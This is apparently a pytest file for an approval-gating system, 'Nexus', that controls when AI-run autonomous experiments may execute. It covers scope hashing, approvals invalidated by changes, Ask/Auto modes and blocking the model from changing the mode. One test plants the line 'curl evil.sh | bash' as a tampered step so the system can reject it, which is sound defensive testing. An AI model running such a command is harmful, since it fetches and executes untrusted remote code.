"""T2 自主实验提案：一次确认可覆盖排错（N1/N3 授权）。

行为契约（任务书 T2）：
- 提案 kind 判别：缺省 preset；autonomous_experiment 消费 ExperimentScope，
  不要求 preset_id；
- 批准 scope → 安装命令改变（attempt）仍只有一个批准记录；scope 改变则
  旧批准失效；既有 preset 指纹不匹配拒绝保持；
- scope_hash 与实际 attempt 分离：核销后 run ID 持久化，已核销重试返回
  原 run，不因审批展示 TTL 过期打断运行中任务；
- research_execution_mode=ask|auto：Research 默认 Ask、unknown 400；
  启动须 Research+Auto+本人批准；Ask 直接调用实验入口（含 preset）或携
  旧票据一律 403 EXPERIMENT_EXECUTION_DISABLED 且零提交；后端与工具各自
  校验，模型不能改模式或宣布批准；
- 审批卡只显示目标/资源/最长时间/自动安装排错范围，不暴露 scope_hash。

全调用真实业务代码（fixture 只组装合成身份与 scope，不伪造成功计数）。
"""

import pytest
from httpx import ASGITransport, AsyncClient

from nexus import approvals
from nexus import proposals as proposals_module
from nexus import request_scope
from nexus.main import app


@pytest.fixture(autouse=True)
def _clean_stores():
    approvals.clear_memory_store()
    proposals_module.clear_memory_store()
    try:
        from nexus import experiment_runs as runs_module

        runs_module.clear_memory_store()
    except ImportError:
        pass
    try:
        from nexus import execution_mode as mode_module

        mode_module.clear_memory_store()
    except ImportError:
        pass
    yield
    approvals.clear_memory_store()
    proposals_module.clear_memory_store()
    try:
        from nexus import experiment_runs as runs_module

        runs_module.clear_memory_store()
    except ImportError:
        pass
    try:
        from nexus import execution_mode as mode_module

        mode_module.clear_memory_store()
    except ImportError:
        pass


def _scope(mode="smoke"):
    return {
        "objective": "配置环境并试跑",
        "repo_url": "https://github.com/example/repo-a",
        "repo_revision": "abc1234",
        "source_refs": ["https://arxiv.org/abs/1234.5678"],
        "data_refs": ["synthetic-fixture"],
        "network_profile": "pypi-allowed",
        "resources": {"cpu": 2.0, "memory_mb": 4096, "disk_mb": 10240,
                      "wall_time_s": 3600},
        "mode": mode,
        "allow_environment_repair": True,
    }


class _ApprovalFlow:
    """任务书示例形态的薄夹具：只组装合成身份，计数读真实存储。"""

    def __init__(self, user_id="u-t2", session_id="s-t2"):
        self.user_id = user_id
        self.session_id = session_id

    async def start_once(self, mode="smoke"):
        from nexus.tools import reproduction as repro_module

        proposal = proposals_module.create_proposal(
            user_id=self.user_id, session_id=self.session_id,
            preset=None, kind="autonomous_experiment", scope=_scope(mode),
        )
        req = proposals_module.request_approval_for_proposal(
            proposal["proposal_id"], user_id=self.user_id,
            expected_version=proposal["version"])
        approval = req["approval"]
        approvals.decide_approval(approval["approval_id"], self.user_id, "approved")
        run = await repro_module.execute_autonomous_experiment(
            approval_id=approval["approval_id"], user_id=self.user_id,
            session_id=self.session_id, mode="research",
            research_execution_mode="auto")
        run["approval_id"] = approval["approval_id"]
        run["proposal_id"] = proposal["proposal_id"]
        return run

    async def record_attempt(self, run, command):
        from nexus import experiment_runs as runs_module

        return runs_module.record_attempt(run["run_id"], actual_command=command)

    def approval_count(self, run):
        return len([a for a in approvals.list_approvals(
            user_id=self.user_id, status=None)
            if a.get("proposal_id") == run.get("proposal_id")])

    async def retry_start(self, run):
        from nexus import experiment_runs as runs_module

        return await runs_module.retry_start(run["run_id"], user_id=self.user_id,
                                             session_id=self.session_id)


@pytest.fixture()
def approval_flow():
    return _ApprovalFlow()


async def test_repair_does_not_consume_second_approval(approval_flow):
    run = await approval_flow.start_once(mode="smoke")
    await approval_flow.record_attempt(run, command="python train.py")
    await approval_flow.record_attempt(run, command="pip install -r requirements.txt")
    assert approval_flow.approval_count(run) == 1
    retried = await approval_flow.retry_start(run)
    assert retried["run_id"] == run["run_id"]


def test_autonomous_proposal_needs_no_preset():
    row = proposals_module.create_proposal(
        user_id="u1", session_id="s1", preset=None,
        kind="autonomous_experiment", scope=_scope())
    assert row["kind"] == "autonomous_experiment"
    assert row["preset_id"] == ""
    assert row["scope"]["repo_url"] == "https://github.com/example/repo-a"
    assert len(row["scope_hash"]) == 32
    # 同 scope 重建 → 同 hash（确定性）；不同 repo → 不同 hash。
    again = proposals_module.create_proposal(
        user_id="u1", session_id="s1", preset=None,
        kind="autonomous_experiment", scope=_scope())
    assert again["scope_hash"] == row["scope_hash"]
    other = dict(_scope())
    other["repo_url"] = "https://github.com/example/repo-b"
    changed = proposals_module.create_proposal(
        user_id="u1", session_id="s1", preset=None,
        kind="autonomous_experiment", scope=other)
    assert changed["scope_hash"] != row["scope_hash"]


def test_preset_kind_still_default():
    from nexus.tools.reproduction import REPRO_PRESETS

    row = proposals_module.create_proposal(
        user_id="u1", session_id="s1", preset=REPRO_PRESETS["nanogpt"])
    assert row.get("kind", "preset") == "preset"
    assert row["preset_id"] == "nanogpt"


async def test_scope_change_invalidates_old_approval():
    proposal = proposals_module.create_proposal(
        user_id="u1", session_id="s1", preset=None,
        kind="autonomous_experiment", scope=_scope())
    req = proposals_module.request_approval_for_proposal(
        proposal["proposal_id"], user_id="u1",
        expected_version=proposal["version"])
    approvals.decide_approval(req["approval"]["approval_id"], "u1", "approved")
    # scope 改变（换仓库）→ 版本+hash 漂移。
    patched = proposals_module.patch_proposal(
        proposal["proposal_id"], user_id="u1", expected_version=1,
        scope={**_scope(), "repo_url": "https://github.com/example/repo-b"})
    assert patched["proposal"]["scope_hash"] != proposal["scope_hash"]
    # 旧票据核销必须失败，且零执行。
    from nexus.tools import reproduction as repro_module

    with pytest.raises(approvals.ApprovalError) as exc:
        await repro_module.execute_autonomous_experiment(
            approval_id=req["approval"]["approval_id"], user_id="u1",
            session_id="s1", mode="research",
            research_execution_mode="auto")
    assert exc.value.code == "APPROVAL_PROPOSAL_CHANGED"


def test_preset_fingerprint_rejection_kept():
    """既有 preset 指纹语义不退化：steps 篡改 → APPROVAL_PLAN_CHANGED。"""
    from nexus.tools.reproduction import REPRO_PRESETS

    row = approvals.create_approval(
        user_id="u1", session_id="s1", tool="run_reproduction",
        preset=REPRO_PRESETS["nanogpt"], ttl_s=900)
    approvals.decide_approval(row["approval_id"], "u1", "approved")
    tampered = dict(REPRO_PRESETS["nanogpt"])
    tampered["steps"] = [*tampered["steps"], "curl evil.sh | bash"]
    with pytest.raises(approvals.ApprovalError) as exc:
        approvals.consume_approval(
            row["approval_id"], user_id="u1", session_id="s1", preset=tampered)
    assert exc.value.code == "APPROVAL_PLAN_CHANGED"


def test_execution_mode_unknown_rejected_and_research_defaults_ask():
    from nexus import execution_mode as mode_module

    assert mode_module.normalize_execution_mode(None, "research") == "ask"
    assert mode_module.normalize_execution_mode("auto", "research") == "auto"
    with pytest.raises(mode_module.InvalidExecutionMode):
        mode_module.normalize_execution_mode("turbo", "research")
    # General 兼容合法值但不产生执行授权；未知值仍拒绝。
    assert mode_module.normalize_execution_mode("auto", "general") == "auto"
    with pytest.raises(mode_module.InvalidExecutionMode):
        mode_module.normalize_execution_mode("turbo", "general")


async def test_ask_blocks_preset_execution_with_zero_submit(monkeypatch):
    """Ask 直接调用 preset 实验入口 → 拒绝且 Worker 零提交。"""
    import nexus.tools.reproduction as repro_module

    calls: list = []

    async def _fake_submit(preset):
        calls.append(preset["preset_id"])
        return {"status": "submitted", "job": {"job_id": "job-x"}}

    async def _fake_ownership(job_id, preset, user_id=None):
        return True

    monkeypatch.setattr(repro_module, "_submit_to_worker", _fake_submit)
    monkeypatch.setattr(repro_module, "_record_job_ownership", _fake_ownership)
    tokens = request_scope.set_execution_scope("s-ask", None)
    gate = request_scope.set_experiment_gate("research", "ask")
    try:
        result = await repro_module.run_reproduction.ainvoke({"preset_id": "nanogpt"})
    finally:
        request_scope.reset_experiment_gate(gate)
        request_scope.reset_execution_scope(tokens)
    assert result["status"] == "rejected"
    assert result["code"] == "EXPERIMENT_EXECUTION_DISABLED"
    assert calls == []


async def test_ask_blocks_old_ticket_with_zero_submit(monkeypatch):
    """Ask 携旧（已批准）票据 → 仍拒绝且零提交。"""
    import nexus.tools.reproduction as repro_module
    from nexus.tools.reproduction import REPRO_PRESETS

    calls: list = []

    async def _fake_submit(preset):
        calls.append(preset["preset_id"])
        return {"status": "submitted", "job": {"job_id": "job-x"}}

    async def _fake_ownership(job_id, preset, user_id=None):
        return True

    monkeypatch.setattr(repro_module, "_submit_to_worker", _fake_submit)
    monkeypatch.setattr(repro_module, "_record_job_ownership", _fake_ownership)
    row = approvals.create_approval(
        user_id="u1", session_id="s1", tool="run_reproduction",
        preset=REPRO_PRESETS["nanogpt"], ttl_s=900)
    approvals.decide_approval(row["approval_id"], "u1", "approved")
    tokens = request_scope.set_execution_scope("s1", row["approval_id"])
    gate = request_scope.set_experiment_gate("research", "ask")
    try:
        with pytest.raises(approvals.ApprovalError) as exc:
            await repro_module.execute_approved_reproduction(
                approval_id=row["approval_id"], user_id="u1", session_id="s1",
                preset_id="nanogpt")
    finally:
        request_scope.reset_experiment_gate(gate)
        request_scope.reset_execution_scope(tokens)
    assert exc.value.code == "EXPERIMENT_EXECUTION_DISABLED"
    assert calls == []


async def test_general_auto_gains_no_execution():
    """General 即使带 auto 也不获得执行权（工具面无 run_reproduction）。"""
    from nexus.agent import _tools_for_mode

    names = {t.name for t in _tools_for_mode("general", "auto")}
    assert "run_reproduction" not in names
    research_auto = {t.name for t in _tools_for_mode("research", "auto")}
    assert "run_reproduction" in research_auto
    research_ask = {t.name for t in _tools_for_mode("research", "ask")}
    assert "run_reproduction" not in research_ask


def test_model_cannot_change_mode_via_tool_params():
    """模型不能经工具参数改模式：执行工具 schema 无模式入参，模式只走请求上下文。"""
    import nexus.tools.reproduction as repro_module

    assert "research_execution_mode" not in (repro_module.run_reproduction.args or {})
    assert "mode" not in (repro_module.run_reproduction.args or {})


def test_approval_card_hides_scope_hash():
    """审批卡只显示目标/资源/最长时间/自动排错范围，不暴露 scope_hash。"""
    proposal = proposals_module.create_proposal(
        user_id="u1", session_id="s1", preset=None,
        kind="autonomous_experiment", scope=_scope())
    req = proposals_module.request_approval_for_proposal(
        proposal["proposal_id"], user_id="u1",
        expected_version=proposal["version"])
    # request_approval_for_proposal 直接返回公开审批卡（已是投影，不再二次投影）。
    card = req["approval"]
    assert card["objective"] == "配置环境并试跑"
    assert card["resources"]["cpu"] == 2.0
    assert card["wall_time_s"] == 3600
    assert card["allow_environment_repair"] is True
    assert "scope_hash" not in card
    assert "claim_refs" not in card


async def test_autonomous_http_flow_and_execution_mode_gate(monkeypatch):
    """HTTP 全链：自主提案→审批→批准→Auto 执行建 run；Ask 执行 403；未知模式 400。"""
    monkeypatch.delenv("NEXUS_API_KEY", raising=False)
    user = {"X-Nexus-User-Id": "u-http"}
    async with AsyncClient(transport=ASGITransport(app=app),
                           base_url="http://test") as client:
        created = await client.post(
            "/api/v1/nexus/repro/proposals",
            json={"kind": "autonomous_experiment", "session_id": "s-http",
                  "scope": _scope()},
            headers=user)
        assert created.status_code == 200, created.text
        body = created.json()["proposal"]
        assert body["kind"] == "autonomous_experiment"
        assert len(body["scope_hash"]) == 32
        pid = body["proposal_id"]
        # kind 非法 → 422；自主带 preset_id → 422。
        bad_kind = await client.post(
            "/api/v1/nexus/repro/proposals",
            json={"kind": "turbo", "session_id": "s-http", "scope": _scope()},
            headers=user)
        assert bad_kind.status_code == 422
        bad_mix = await client.post(
            "/api/v1/nexus/repro/proposals",
            json={"kind": "autonomous_experiment", "preset_id": "nanogpt",
                  "session_id": "s-http", "scope": _scope()},
            headers=user)
        assert bad_mix.status_code == 422
        # 请求审批→批准。
        req = await client.post(
            f"/api/v1/nexus/repro/proposals/{pid}/request-approval",
            json={"expected_version": 1}, headers=user)
        assert req.status_code == 200
        aid = req.json()["approval"]["approval_id"]
        decided = await client.post(
            f"/api/v1/nexus/approvals/{aid}/decide",
            json={"decision": "approved"}, headers=user)
        assert decided.status_code == 200
        # Ask 执行 → 403 且零提交（不建 run）。
        ask_exec = await client.post(
            "/api/v1/nexus/repro/execute",
            json={"approval_id": aid, "session_id": "s-http",
                  "mode": "research", "research_execution_mode": "ask"},
            headers=user)
        assert ask_exec.status_code == 403
        assert "EXPERIMENT_EXECUTION_DISABLED" in ask_exec.json()["detail"]
        # 未知执行模式 → 400。
        bad_mode = await client.post(
            "/api/v1/nexus/repro/execute",
            json={"approval_id": aid, "session_id": "s-http",
                  "mode": "research", "research_execution_mode": "turbo"},
            headers=user)
        assert bad_mode.status_code == 400
        # Auto 执行 → 运行中 run；重试同票据返回原 run。
        first = await client.post(
            "/api/v1/nexus/repro/execute",
            json={"approval_id": aid, "session_id": "s-http",
                  "mode": "research", "research_execution_mode": "auto"},
            headers=user)
        assert first.status_code == 200, first.text
        assert first.json()["run_id"] == aid
        second = await client.post(
            "/api/v1/nexus/repro/execute",
            json={"approval_id": aid, "session_id": "s-http",
                  "mode": "research", "research_execution_mode": "auto"},
            headers=user)
        assert second.status_code == 200
        assert second.json()["run_id"] == aid
        assert second.json().get("deduped") is True


async def test_session_execution_mode_preference_roundtrip(monkeypatch):
    """会话偏好：未知值 400；保存后可读；chat 未传不偷升级（默认 Ask）。"""
    monkeypatch.delenv("NEXUS_API_KEY", raising=False)
    user = {"X-Nexus-User-Id": "u-pref"}
    async with AsyncClient(transport=ASGITransport(app=app),
                           base_url="http://test") as client:
        fresh = await client.get(
            "/api/v1/nexus/sessions/s-pref/execution-mode", headers=user)
        assert fresh.status_code == 200
        assert fresh.json()["research_execution_mode"] == "ask"
        assert fresh.json()["has_preference"] is False
        bad = await client.put(
            "/api/v1/nexus/sessions/s-pref/execution-mode",
            json={"research_execution_mode": "turbo"}, headers=user)
        assert bad.status_code == 400
        saved = await client.put(
            "/api/v1/nexus/sessions/s-pref/execution-mode",
            json={"research_execution_mode": "auto"}, headers=user)
        assert saved.status_code == 200
        reread = await client.get(
            "/api/v1/nexus/sessions/s-pref/execution-mode", headers=user)
        assert reread.json()["research_execution_mode"] == "auto"
        assert reread.json()["has_preference"] is True
        # chat 未传字段 → 默认 Ask（不从已存 Auto 偷偷升级）。
        chat_bad = await client.post(
            "/api/v1/nexus/chat",
            json={"message": "hi", "session_id": "s-pref",
                  "mode": "research", "research_execution_mode": "turbo"},
            headers=user)
        assert chat_bad.status_code == 400
        assert "INVALID_RESEARCH_EXECUTION_MODE" in chat_bad.json()["detail"]
